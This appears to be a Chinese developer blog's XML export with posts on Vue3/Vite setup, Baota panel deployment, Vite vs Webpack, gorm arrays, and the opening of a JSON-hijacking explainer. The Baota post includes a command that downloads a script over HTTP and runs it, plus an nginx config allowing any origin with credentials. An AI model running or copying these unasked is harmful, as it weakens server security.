class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; api/user.js</span></span><br><span class="line"><span class="string">import request from &quot;../utils/request&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * 获取验证码</span></span><br><span class="line"><span class="string"> * @param checkKey</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">export function getCodeInfo(checkKey) &#123;</span></span><br><span class="line"><span class="string">  return request(&#123;</span></span><br><span class="line"><span class="string">    method: &quot;get&quot;,</span></span><br><span class="line"><span class="string">    url: &#x27;&#x27;,</span></span><br><span class="line"><span class="string">  &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; store/modules/user.js</span></span><br><span class="line"><span class="string">// src/store/modules/user.js</span></span><br><span class="line"><span class="string">import &#123; defineStore &#125; from &quot;pinia&quot;;</span></span><br><span class="line"><span class="string">import &#123; ref &#125; from &quot;vue&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const useUserStore = defineStore(&quot;user&quot;, () =&gt; &#123;</span></span><br><span class="line"><span class="string">  const userInfo = ref(&#123;&#125;);</span></span><br><span class="line"><span class="string">  const loginStatus = ref(false);</span></span><br><span class="line"><span class="string">  const token = ref(&quot;&quot;);</span></span><br><span class="line"><span class="string">  /**</span></span><br><span class="line"><span class="string">   * 登录</span></span><br><span class="line"><span class="string">   */</span></span><br><span class="line"><span class="string">  function handleLogin() &#123;</span></span><br><span class="line"><span class="string">    return new Promise((resolve, reject) =&gt; &#123;</span></span><br><span class="line"><span class="string">      if (Math.random() &gt; 0.8) &#123;</span></span><br><span class="line"><span class="string">        loginStatus.value = true;</span></span><br><span class="line"><span class="string">        token.value = String(new Date().getTime());</span></span><br><span class="line"><span class="string">        userInfo.value = &#123;</span></span><br><span class="line"><span class="string">          name: &quot;admin&quot;,</span></span><br><span class="line"><span class="string">          avatar: &quot;https://wpimg.wallstcn.com/f778738c-e4f8-4870-b634-56703b4acafe.gif?imageView2/1/w/80/h/80&quot;,</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">        resolve(&quot;登录成功&quot;);</span></span><br><span class="line"><span class="string">      &#125; else &#123;</span></span><br><span class="line"><span class="string">        reject(&quot;登录失败&quot;);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  /**</span></span><br><span class="line"><span class="string">   * 退出登录</span></span><br><span class="line"><span class="string">   */</span></span><br><span class="line"><span class="string">  function handleLogout() &#123;</span></span><br><span class="line"><span class="string">    return new Promise((resolve) =&gt; &#123;</span></span><br><span class="line"><span class="string">      loginStatus.value = false;</span></span><br><span class="line"><span class="string">      token.value = &quot;&quot;;</span></span><br><span class="line"><span class="string">      userInfo.value = &#123;&#125;;</span></span><br><span class="line"><span class="string">      resolve();</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  return &#123;</span></span><br><span class="line"><span class="string">    userInfo,</span></span><br><span class="line"><span class="string">    loginStatus,</span></span><br><span class="line"><span class="string">    token,</span></span><br><span class="line"><span class="string">    handleLogin,</span></span><br><span class="line"><span class="string">    handleLogout,</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">export default useUserStore;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; store/index.js</span></span><br><span class="line"><span class="string">// src/store/index.js</span></span><br><span class="line"><span class="string">import &#123; createPinia &#125; from &quot;pinia&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const pinia = createPinia();</span></span><br><span class="line"><span class="string">export default pinia;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; router/index.js</span></span><br><span class="line"><span class="string">// src/router/index.js</span></span><br><span class="line"><span class="string">import &#123;createRouter, createWebHistory&#125; from &quot;vue-router&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const router = new createRouter(&#123;</span></span><br><span class="line"><span class="string">  history: createWebHistory(),</span></span><br><span class="line"><span class="string">  routes: [</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      path: &quot;/&quot;,</span></span><br><span class="line"><span class="string">      component: () =&gt; import(&quot;../views/hall/index.vue&quot;),</span></span><br><span class="line"><span class="string">      children: [</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          path: &quot;hall&quot;,</span></span><br><span class="line"><span class="string">          component: () =&gt; import(&quot;../views/hall/index.vue&quot;)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      ]</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      path: &quot;/login&quot;,</span></span><br><span class="line"><span class="string">      name: &quot;Login&quot;,</span></span><br><span class="line"><span class="string">      component: () =&gt; import(&quot;../views/login/index.vue&quot;),</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      path: &quot;/dashboard&quot;,</span></span><br><span class="line"><span class="string">      name: &quot;Dashboard&quot;,</span></span><br><span class="line"><span class="string">      component: () =&gt; import(&quot;../views/dashboard/index.vue&quot;),</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">  ],</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">export default router;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; layouts/HomeLayout.vue</span></span><br><span class="line"><span class="string">&lt;template&gt;</span></span><br><span class="line"><span class="string">  &lt;header class=&quot;header&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;logo&quot;&gt;XXX&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;search-bar&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; placeholder=&quot;提问&quot; /&gt;</span></span><br><span class="line"><span class="string">      &lt;button&gt;搜索&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;user-actions&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;span&gt;消息&lt;/span&gt;</span></span><br><span class="line"><span class="string">      &lt;span&gt;私信&lt;/span&gt;</span></span><br><span class="line"><span class="string">      &lt;span&gt;创作中心&lt;/span&gt;</span></span><br><span class="line"><span class="string">      &lt;span&gt;草稿箱&lt;/span&gt;</span></span><br><span class="line"><span class="string">      &lt;img src=&quot;https://img.icons8.com/ios/452/user&quot; alt=&quot;用户头像&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;/header&gt;</span></span><br><span class="line"><span class="string">  &lt;el-main class=&quot;main-content&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;router-view&gt;&lt;/router-view&gt;</span></span><br><span class="line"><span class="string">  &lt;/el-main&gt;</span></span><br><span class="line"><span class="string">&lt;/template&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">export default &#123;</span></span><br><span class="line"><span class="string">  name: &quot;HeaderLayout&quot;,</span></span><br><span class="line"><span class="string">  data() &#123;</span></span><br><span class="line"><span class="string">    return &#123;</span></span><br><span class="line"><span class="string">      activeMenu: this.getActiveMenu(),</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">  methods: &#123;</span></span><br><span class="line"><span class="string">    goHome() &#123;</span></span><br><span class="line"><span class="string">      this.$router.push(&quot;/home&quot;);</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    getActiveMenu() &#123;</span></span><br><span class="line"><span class="string">      const path = this.$route.path;</span></span><br><span class="line"><span class="string">      return &quot;hall&quot;;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">  watch: &#123;</span></span><br><span class="line"><span class="string">    $route() &#123;</span></span><br><span class="line"><span class="string">      this.activeMenu = this.getActiveMenu();</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;style scoped&gt;</span></span><br><span class="line"><span class="string">/* Header Styles */</span></span><br><span class="line"><span class="string">.header &#123;</span></span><br><span class="line"><span class="string">  display: flex;</span></span><br><span class="line"><span class="string">  justify-content: space-between;</span></span><br><span class="line"><span class="string">  align-items: center;</span></span><br><span class="line"><span class="string">  padding: 15px 30px;</span></span><br><span class="line"><span class="string">  background-color: #ffffff;</span></span><br><span class="line"><span class="string">  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);</span></span><br><span class="line"><span class="string">  border-bottom: 1px solid #f0f0f0;</span></span><br><span class="line"><span class="string">  font-family: Arial, sans-serif;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.logo &#123;</span></span><br><span class="line"><span class="string">  font-size: 28px;</span></span><br><span class="line"><span class="string">  font-weight: bold;</span></span><br><span class="line"><span class="string">  color: #333;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.search-bar &#123;</span></span><br><span class="line"><span class="string">  display: flex;</span></span><br><span class="line"><span class="string">  align-items: center;</span></span><br><span class="line"><span class="string">  position: relative;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.search-bar input &#123;</span></span><br><span class="line"><span class="string">  padding: 8px 15px;</span></span><br><span class="line"><span class="string">  border: 1px solid #ccc;</span></span><br><span class="line"><span class="string">  border-radius: 25px;</span></span><br><span class="line"><span class="string">  width: 250px;</span></span><br><span class="line"><span class="string">  font-size: 14px;</span></span><br><span class="line"><span class="string">  outline: none;</span></span><br><span class="line"><span class="string">  transition: border-color 0.3s;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.search-bar input:focus &#123;</span></span><br><span class="line"><span class="string">  border-color: #007aff;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.search-bar button &#123;</span></span><br><span class="line"><span class="string">  padding: 8px 15px;</span></span><br><span class="line"><span class="string">  background-color: #007aff;</span></span><br><span class="line"><span class="string">  color: white;</span></span><br><span class="line"><span class="string">  border: none;</span></span><br><span class="line"><span class="string">  cursor: pointer;</span></span><br><span class="line"><span class="string">  border-radius: 25px;</span></span><br><span class="line"><span class="string">  position: absolute;</span></span><br><span class="line"><span class="string">  right: -10px;</span></span><br><span class="line"><span class="string">  transition: background-color 0.3s;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.search-bar button:hover &#123;</span></span><br><span class="line"><span class="string">  background-color: #0056b3;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.user-actions &#123;</span></span><br><span class="line"><span class="string">  display: flex;</span></span><br><span class="line"><span class="string">  align-items: center;</span></span><br><span class="line"><span class="string">  font-size: 14px;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.user-actions span &#123;</span></span><br><span class="line"><span class="string">  margin-right: 15px;</span></span><br><span class="line"><span class="string">  cursor: pointer;</span></span><br><span class="line"><span class="string">  transition: color 0.3s;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.user-actions span:hover &#123;</span></span><br><span class="line"><span class="string">  color: #007aff;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.user-actions img &#123;</span></span><br><span class="line"><span class="string">  width: 36px;</span></span><br><span class="line"><span class="string">  height: 36px;</span></span><br><span class="line"><span class="string">  border-radius: 50%;</span></span><br><span class="line"><span class="string">  border: 2px solid #007aff;</span></span><br><span class="line"><span class="string">  cursor: pointer;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* Main Content Styles */</span></span><br><span class="line"><span class="string">.main-content &#123;</span></span><br><span class="line"><span class="string">  padding: 20px;</span></span><br><span class="line"><span class="string">  background-color: #f9f9f9;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; layouts/NotFoundLayout.vue</span></span><br><span class="line"><span class="string">&lt;script setup&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;template&gt;</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;404 Not Found&lt;/h1&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/template&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;style scoped&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>进入package.json文件，修改scripts字段</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite build&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;serve&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite preview&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;prettier&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prettier --write src/**/*.&#123;vue,js,jsx,ts,tsx,json,css,scss,md&#125;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://blog.csdn.net/m0_74825447/article/details/144637339">手把手完成前端Vue3 + Vite项目工程化搭建</a></li>
</ul>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>使用宝塔部署前后端项目</title>
    <url>/2025/01/16/%E4%BD%BF%E7%94%A8%E5%AE%9D%E5%A1%94%E9%83%A8%E7%BD%B2%E5%89%8D%E5%90%8E%E7%AB%AF%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h1 id="使用宝塔部署前后端项目"><a href="#使用宝塔部署前后端项目" class="headerlink" title="使用宝塔部署前后端项目"></a>使用宝塔部署前后端项目</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>宝塔面板是一款非常好用的服务器管理软件，可以帮助我们快速部署前后端项目，下面我们就来看看如何使用宝塔部署前后端项目。</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-安装宝塔面板"><a href="#1-安装宝塔面板" class="headerlink" title="1. 安装宝塔面板"></a>1. 安装宝塔面板</h3><p>CentOS系统下执行以下命令安装宝塔面板：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br></pre></td></tr></table></figure>

<h3 id="2-登录宝塔面板"><a href="#2-登录宝塔面板" class="headerlink" title="2. 登录宝塔面板"></a>2. 登录宝塔面板</h3><p>安装完成后，会提供登录地址、用户名和密码，打开浏览器输入地址，输入用户名和密码登录。</p>
<h3 id="3-开放安全组端口"><a href="#3-开放安全组端口" class="headerlink" title="3. 开放安全组端口"></a>3. 开放安全组端口</h3><p>登录阿里云控制台，找到安全组，开放端口。</p>
<p><img src="/images/image1.png" alt="alt text"></p>
<p>同时，登录宝塔面板，找到防火墙，开放端口。</p>
<p><img src="/images/image2.png" alt="alt text"></p>
<h3 id="4-创建数据库"><a href="#4-创建数据库" class="headerlink" title="4. 创建数据库"></a>4. 创建数据库</h3><p>登录宝塔面板后，点击左侧的数据库，然后点击创建数据库，输入数据库名称、用户名和密码，点击创建即可。</p>
<h3 id="5-部署前端项目"><a href="#5-部署前端项目" class="headerlink" title="5. 部署前端项目"></a>5. 部署前端项目</h3><p>点击左侧的网站，然后点击添加站点，输入站点名称、域名、根目录，点击提交即可。</p>
<h3 id="6-配置Nginx"><a href="#6-配置Nginx" class="headerlink" title="6. 配置Nginx"></a>6. 配置Nginx</h3><p>点击左侧的网站，然后点击设置，找到Nginx配置文件，将前端项目的Nginx配置文件替换为以下内容：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">5173</span>;</span><br><span class="line">    <span class="attribute">server_name</span> <span class="number">8.134.51.50</span>;</span><br><span class="line">    <span class="attribute">index</span> index.php index.html index.htm default.php default.htm default.html;</span><br><span class="line">    <span class="attribute">root</span> /www/wwwroot/ssewhy/front/dist/;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># CORS 配置</span></span><br><span class="line">    <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span> <span class="string">&#x27;*&#x27;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span> <span class="string">&#x27;GET, POST, PUT, DELETE, OPTIONS&#x27;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span> <span class="string">&#x27;Origin, Content-Type, Accept, Authorization, X-Requested-With&#x27;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span> <span class="string">&#x27;true&#x27;</span> always;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># API 路由配置</span></span><br><span class="line">    <span class="section">location</span> /api &#123;</span><br><span class="line">        <span class="attribute">if</span> (<span class="variable">$request_method</span> = <span class="string">&#x27;OPTIONS&#x27;</span>) &#123;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span> <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span> <span class="string">&#x27;GET, POST, PUT, DELETE, OPTIONS&#x27;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span> <span class="string">&#x27;Origin, Content-Type, Accept, Authorization, X-Requested-With&#x27;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span> <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Content-Length&#x27;</span> <span class="number">0</span>;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="string">&#x27;text/plain; charset=utf-8&#x27;</span>;</span><br><span class="line">            <span class="attribute">return</span> <span class="number">204</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span> <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">        <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span> <span class="string">&#x27;GET, POST, PUT, DELETE, OPTIONS&#x27;</span>;</span><br><span class="line">        <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span> <span class="string">&#x27;Origin, Content-Type, Accept, Authorization, X-Requested-With&#x27;</span>;</span><br><span class="line">        <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span> <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">proxy_pass</span> http://8.134.51.50:8080;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 其他配置</span></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="7-部署后端项目"><a href="#7-部署后端项目" class="headerlink" title="7. 部署后端项目"></a>7. 部署后端项目</h3><p>将后端jar包打包好，然后上传到服务器，运行命令：</p>
<p>前台运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar xxx.jar</span><br></pre></td></tr></table></figure>

<p>后台运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> java -jar xxx.jar &amp;</span><br></pre></td></tr></table></figure>

<h3 id="8-访问项目"><a href="#8-访问项目" class="headerlink" title="8. 访问项目"></a>8. 访问项目</h3><p>打开浏览器输入域名，即可访问项目。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://www.bt.cn/">宝塔面板</a></li>
<li><a href="https://blog.csdn.net/qq_64734490/article/details/144910584">前后端分离项目部署到云服务器</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>前端构建工具 Vite vs Webpack</title>
    <url>/2024/12/23/vite-vs-webpack/</url>
    <content><![CDATA[<h1 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h1><p>Webpack 是一个基于打包器的构建工具，同一个入口文件的代码会打包成一个 Bundle 文件。Webpack 长期来的一个痛点是对于大规模应用的应用启动和热更新速度很慢。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g vue-cli@latest</span><br></pre></td></tr></table></figure>

<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vue create my-project</span><br></pre></td></tr></table></figure>

<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure>

<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=513827141&bvid=BV11g411y7Sd&cid=782308128&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>

<h1 id="Vite"><a href="#Vite" class="headerlink" title="Vite"></a>Vite</h1><p>Vite 是旨在提升开发者体验的下一代 JavaScript 构建工具，核心借助了浏览器的原生 ES Modules 和像 esbuild 这样的将代码编译成 native code 的打包工具。</p>
<h2 id="创建项目-1"><a href="#创建项目-1" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm create vite</span><br></pre></td></tr></table></figure>

<h2 id="安装依赖-1"><a href="#安装依赖-1" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<h2 id="运行-1"><a href="#运行-1" class="headerlink" title="运行"></a>运行</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure>

<h2 id="打包-1"><a href="#打包-1" class="headerlink" title="打包"></a>打包</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure>

<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=724167325&bvid=BV1yS4y1r7nE&cid=512991161&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Webpack 和 Vite 都是构建工具，个人而言，开发小型项目时，Vite 会更快，而开发大型项目时，Webpack 会更稳定。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/sunyctf/article/details/128059586">https://blog.csdn.net/sunyctf/article/details/128059586</a><br><a href="https://juejin.cn/post/7106136866381889573">https://juejin.cn/post/7106136866381889573</a></p>
<style>
    iframe {
      width: 100%;
      height: 500px;
    }
  </style>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>gorm-mysql数组类型的处理方法</title>
    <url>/2025/03/04/gorm-mysql%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="gorm-mysql数组类型的处理方法"><a href="#gorm-mysql数组类型的处理方法" class="headerlink" title="gorm-mysql数组类型的处理方法"></a>gorm-mysql数组类型的处理方法</h2><h3 id="1-使用json存储数组"><a href="#1-使用json存储数组" class="headerlink" title="1. 使用json存储数组"></a>1. 使用json存储数组</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">FormList []<span class="type">uint</span> <span class="string">`json:&quot;form_list&quot; gorm:&quot;type:json;serializer:json&quot;`</span></span><br></pre></td></tr></table></figure>

<p>FormList存储了表单的ID，是一个数组类型，使用json存储。</p>
<p>使用序列化来处理数组的存储和读取。</p>
<h3 id="2-使用string拼接"><a href="#2-使用string拼接" class="headerlink" title="2. 使用string拼接"></a>2. 使用string拼接</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">FormList <span class="type">string</span> <span class="string">`json:&quot;form_list&quot; gorm:&quot;type:varchar(255)&quot;`</span></span><br></pre></td></tr></table></figure>

<p>FormList存储了表单的ID，使用string拼接存储。</p>
<p>例如：<code>1,2,3,4,5</code></p>
<p>之后读取的时候，使用<code>strings.Split</code>来处理。</p>
<h3 id="其他方法（待补充）"><a href="#其他方法（待补充）" class="headerlink" title="其他方法（待补充）"></a>其他方法（待补充）</h3>]]></content>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>SecureJSON-防范JSON劫持</title>
    <url>/2025/03/04/SecureJSON-%E9%98%B2%E8%8C%83JSON%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<h3 id="一、先理解基本概念"><a href="#一、先理解基本概念" class="headerlink" title="一、先理解基本概念"></a><strong>一、先理解基本概念</strong></h3><ol>
<li><p><strong>同源策略（Same-Origin Policy）</strong><br>浏览器的一个核心安全机制，限制不同源的脚本互相访问数据。  </p>
<ul>
<li><strong>“同源”定义</strong>：协议、域名、端口完全一致。</li>
<li><strong>作用</strong>：防止恶意网站通过脚本窃取其他网站的数据（如 Cookie、敏感信息）。</li>
</ul>
</li>
<li><p><strong>JSON 劫持（JSON Hijacking）</strong><br>一种攻击手段，攻击者通过恶意脚本窃取网站返回的 JSON 数据。  </p>
<ul>
<li><strong>常见场景</strong>：JSON 数据通过 <code>&lt;script&gt;</code> 标签加载（跨域请求），且返回的是<strong>数组格式</strong>（如 <code>[&#123;&quot;id&quot;: 1&#125;]</code>）。</li>
<li><strong>攻击原理</strong>：利用浏览器特性（如覆盖 JavaScript 内置对象的原型方法），在数据加载时窃取内容。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="二、JSON-劫持如何绕过同源策略？"><a href="#二、JSON-劫持如何绕过同源策略？" class="headerlink" title="二、JSON 劫持如何绕过同源策略？"></a><strong>二、JSON 劫持如何绕过同源策略？</strong></h3><p>虽然同源策略限制了跨域脚本直接读取响应内容，但以下方式可能被利用：</p>
<ol>
